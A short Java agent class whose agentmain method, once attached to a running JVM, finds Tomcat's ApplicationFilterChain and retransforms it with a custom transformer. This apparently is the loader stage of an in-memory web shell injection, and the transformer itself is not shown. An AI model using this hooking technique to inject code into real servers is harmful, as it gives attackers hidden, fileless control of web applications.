package com.luc.agentmain;

import java.io.IOException;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class SpringBootAgent {
    public static void agentmain(String agentArgs, Instrumentation ins) throws IOException, UnmodifiableClassException {
        Class[] classes = ins.getAllLoadedClasses();
        for (Class aClass : classes) {
            if(aClass.getName().contains("ApplicationFilterChain")){
                ins.addTransformer(new SpringBootDefineTransformer(),true);
                ins.retransformClasses(aClass);
            }
        }
    }
}
